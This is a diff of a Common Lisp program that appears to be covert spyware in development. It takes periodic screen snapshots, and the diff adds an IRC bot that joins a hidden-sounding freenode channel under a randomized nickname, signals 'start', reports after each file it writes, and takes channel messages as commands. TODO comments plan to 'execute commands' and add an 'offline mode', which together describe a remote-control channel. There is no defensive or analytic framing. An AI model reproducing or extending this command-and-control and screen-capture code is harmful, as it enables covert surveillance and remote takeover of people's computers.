@@ -6,6 +6,7 @@
 (ql:quickload "cl-ppcre")
 (ql:quickload "cl-base64")
 (ql:quickload "prbs")
+(ql:quickload "cl-irc")
 
 (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
   (let* ((png (make-instance 'zpng:png :width width :height height
@@ -444,42 +445,120 @@
                                  :if-exists :supersede
                                  :if-does-not-exist :create
                                  :element-type '(unsigned-byte 8))
-      (write-sequence decoded file-stream))
+      (write-sequence decoded file-stream)
+      (cl-irc:privmsg *irc-conn* *irc-chan* "qwe"))
     ))
 
-;; TODO: get-png-sequence and encrypt
+;; START: send to irc
+;; (ql:quickload "cl-irc")
 
-(let ((prev)
-      (cnt 9999))
-  (defun shot-func ()
-    (format t "~%::shot-func")
-    (let* ((snap (pack-image (x-snapshot)))
-           (dims (array-dimensions snap)))
-      (if (> cnt 4)
-          (progn
-            (save "FILE~A" dims snap)
-            (setf prev snap)
-            (setf cnt 0))
-          ;; else
-          (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
-            (do ((qy 0 (incf qy)))
-                ((= qy (car dims)))
-              (declare (type fixnum qy))
-              (do ((qx 0 (incf qx)))
-                  ((= qx (cadr dims)))
-                (declare (type fixnum qx))
-                (setf (aref xored qy qx)
-                      (logxor (aref prev qy qx)
-                              (aref snap qy qx)))))
-            (save "FILE~ADIFF" dims xored)
-            (setf prev snap)
-            (incf cnt))))
-    ;; re-schedule times
-    (schedule-timer *shot-timer* 1 :absolute-p nil)))
+;; TODO: receive from irc
+;; TODO: execute commands
+;; TODO: offline mode
+
+;; (let ((prev)
+;;       (cnt 9999))
+;;   (defun shot-func ()
+;;     (format t "~%::shot-func")
+;;     (let* ((snap (pack-image (x-snapshot)))
+;;            (dims (array-dimensions snap)))
+;;       (if (> cnt 4)
+;;           (progn
+;;             (save "FILE~A" dims snap)
+;;             (setf prev snap)
+;;             (setf cnt 0))
+;;           ;; else
+;;           (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
+;;             (do ((qy 0 (incf qy)))
+;;                 ((= qy (car dims)))
+;;               (declare (type fixnum qy))
+;;               (do ((qx 0 (incf qx)))
+;;                   ((= qx (cadr dims)))
+;;                 (declare (type fixnum qx))
+;;                 (setf (aref xored qy qx)
+;;                       (logxor (aref prev qy qx)
+;;                               (aref snap qy qx)))))
+;;             (save "FILE~ADIFF" dims xored)
+;;             (setf prev snap)
+;;             (incf cnt))))
+;;     ;; re-schedule times
+;;     (schedule-timer *shot-timer* 1 :absolute-p nil)))
+
 
 (defparameter *shot-timer*
   (make-timer #'(lambda ()
                   (shot-func))
               :name "shot" :thread t))
 
-(schedule-timer *shot-timer* 0.5)
+(defparameter *irc-user* (format nil "sham_~A" (get-universal-time)))
+(defparameter *irc-serv* "irc.freenode.org")
+(defparameter *irc-chan* "#nvrtlessfndout")
+(defparameter *irc-lock* (bt:make-lock "irc-lock"))
+
+(defparameter *irc-conn*
+  (cl-irc:connect :nickname *irc-user* :server *irc-serv*))
+
+(defun irc-func ()
+  (cl-irc:read-message-loop *irc-conn*))
+
+(defparameter *irc-thread*
+  (bt:make-thread (lambda ()
+                    (irc-func))
+                  :name "irc-thread"
+                  :initial-bindings
+                  `((*standard-output* . ,*standard-output*)
+                    (*irc-user* . ,*irc-user*)
+                    (*irc-serv* . ,*irc-serv*)
+                    (*irc-chan* . ,*irc-chan*)
+                    (*irc-conn* . ,*irc-conn*))))
+
+;; get all slots by class name
+;; (ql:quickload "closer-mop")
+;; (mapcar #'closer-mop:slot-definition-name
+;;         (closer-mop:class-slots
+;;          (find-class 'cl-irc:IRC-PRIVMSG-MESSAGE)))
+;; CL-IRC:SOURCE
+;; CL-IRC:USER
+;; CL-IRC:HOST
+;; CL-IRC:COMMAND
+;; CL-IRC:ARGUMENTS
+;; CL-IRC:CONNECTION
+;; CL-IRC:RECEIVED-TIME
+;; CL-IRC:RAW-MESSAGE-STRING
+
+(defparameter *irc-cmd*
+  (lambda (param)
+    ;; (format t "~%<:3333[~A]:>~%" param)
+    ;; (format t "~A: ~A" "CL-IRC:SOURCE" (CL-IRC:SOURCE param))
+    ;; (format t "~%~A: ~A" "CL-IRC:USER" (CL-IRC:USER param))
+    ;; (format t "~%~A:~A" "CL-IRC:HOST" (CL-IRC:HOST param))
+    ;; (format t "~%~A:  ~A" "CL-IRC:COMMAND" (CL-IRC:COMMAND param))
+    ;; (format t "~%~A: ~A" "CL-IRC:ARGUMENTS" (CL-IRC:ARGUMENTS param))
+    ;; (format t "~%~A: ~A" "CL-IRC:CONNECTION" (CL-IRC:CONNECTION param))
+    ;; (format t "~%~A: ~A" "CL-IRC:RECEIVED-TIME" (CL-IRC:RECEIVED-TIME param))
+    ;; (format t "~%---------------")
+    ;; (format t "~%~A:~A" "CL-IRC:RAW-MESSAGE-STRING"
+    ;;         (CL-IRC:RAW-MESSAGE-STRING param))
+    ;; (format t "~%===================")
+    (let ((msg (cadr (CL-IRC:ARGUMENTS param))))
+      (format t "~%::COMMAND::~A::" msg))
+    (finish-output)))
+
+(defun irc-msg-hook (param)
+  "MUST return T for stop hooks processing"
+  (funcall *irc-cmd* param)
+  t)
+
+(cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
+
+(sleep 3)
+
+(bt:with-lock-held (*irc-lock*)
+  (cl-irc:join *irc-conn* *irc-chan*))
+
+(sleep 3)
+
+(bt:with-lock-held (*irc-lock*)
+  (cl-irc:privmsg *irc-conn* *irc-chan* "start"))
+
+;; (schedule-timer *shot-timer* 0.5)
